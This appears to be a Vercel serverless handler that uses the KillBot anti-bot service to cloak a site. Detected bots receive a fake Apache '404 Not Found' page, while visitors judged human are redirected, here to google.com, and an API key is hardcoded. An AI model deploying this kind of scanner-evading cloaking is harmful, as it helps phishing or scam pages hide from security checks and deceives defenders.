import KillBot from 'killbot.to';

// Renseigne ta clé API KillBot
const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

export default async function handler(req, res) {
  try {
    const result = await killBot.checkReq(req);

    if (result.block) {
      // CAS BOT/BLOQUÉ => on affiche la page "404 Not Found" demandée
      const notFoundPage = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head><title>404 Not Found</title></head>
<body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.57 (Debian) Server at vercel.app Port 80</address>
</body>
</html>`;

      // Renvoie un statut 404 avec le HTML en question
      res.status(404).send(notFoundPage);
    } else {
      // CAS LÉGITIME => redirection vers google.com
      res.writeHead(302, { Location: 'https://google.com' });
      res.end();
    }
  } catch (error) {
    console.error('KillBot error:', error);
    // Erreur interne => 500
    res.status(500).send('Internal Server Error');
  }
}